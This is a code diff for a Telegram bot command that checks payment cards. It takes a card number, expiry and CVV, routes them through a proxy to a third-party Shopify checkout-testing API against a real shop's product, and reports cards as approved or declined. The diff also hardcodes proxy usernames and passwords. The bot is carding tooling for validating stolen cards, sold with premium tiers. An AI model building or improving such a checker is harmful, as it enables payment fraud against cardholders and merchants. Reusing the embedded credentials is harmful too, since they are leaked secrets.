@@ -17,7 +17,7 @@ async def cmd_ss1(client, message):
         if not regdata:
             return await message.reply("❌ You are not registered. Use /register first.")
 
-        role = (regdata[2] or "FREE").upper()
+        role = regdata[2].upper() if regdata[2] else "FREE"
         credit = int(regdata[5] or 0)
         wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
         antispam_time = int(regdata[7] or 0)
@@ -25,7 +25,7 @@ async def cmd_ss1(client, message):
 
         if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply(
-                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this command in bot PM.\nJoin our group to use it for FREE:",
+                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin our group to use it for FREE:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                 ]),
@@ -48,7 +48,7 @@ async def cmd_ss1(client, message):
         if not cc_text:
             return await message.reply("❌ Usage: /ss1 <cc|mm|yy|cvv>")
 
-        match = re.search(r'(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})', cc_text)
+        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
             return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")
 
@@ -65,8 +65,7 @@ f"""<code>┏━━━━━━━⍟</code>
 
         tic = time.perf_counter()
 
-        proxy_url = "http://purevpn0s3726055:Snakes14@prox-au.pointtoserver.com:10799"
-        raw_proxy = "prox-au.pointtoserver.com:10799:purevpn0s3726055:Snakes14"
+        proxy_url = "http://Indexui184a999e:4fba9e5235e8@proxy.speedproxies.net:12321"
         transport = AsyncHTTPTransport(proxy=proxy_url)
 
         try:
@@ -77,18 +76,18 @@ f"""<code>┏━━━━━━━⍟</code>
                         "card": fullcc,
                         "product_url": "https://musicworksunlimited.com/products/cuddle-up-cuddle-cub-music-single",
                         "email": None,
-                        "proxy": raw_proxy,
+                        "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                         "ship_address": None,
                         "is_shippable": False
                     }
                 }
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                 data = res.json()
-                msg_raw = data.get("message") or data.get("error") or "No response"
-                status = "Approved ✅" if any(x in msg_raw.lower() for x in ["processedreceipt", "zip", "avs", "charged", "incorrect_cvc", "insufficient"]) else "Declined ❌"
-                card_message = msg_raw
+                raw_msg = data.get("message") or data.get("error") or "No response"
+                msg_check = raw_msg.lower()
+                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
+                card_message = raw_msg
 
-                # BIN lookup
                 binres = await http_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
                 bininfo = binres.json()
                 brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
@@ -98,12 +97,13 @@ f"""<code>┏━━━━━━━⍟</code>
                 country = str(bininfo.get("country_name", "N/A")).upper()
                 flag = bininfo.get("country_flag", "🏳️")
         except Exception as e:
-            status = "Error"
+            card_status = "error"
             card_message = f"Request failed: {e}"
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
 
         toc = time.perf_counter()
+        status = "Approved ✅" if card_status == "approved" else "Declined ❌"
 
         final_msg = f"""
 <code>┏━━━━━━━⍟</code>
@@ -134,4 +134,4 @@ f"""<code>┏━━━━━━━⍟</code>
         plan_expirychk(user_id)
 
     except Exception as e:
-        await message.reply_text(f"❌ Error: {str(e)}")
+        await message.reply(f"❌ Error: {str(e)}")
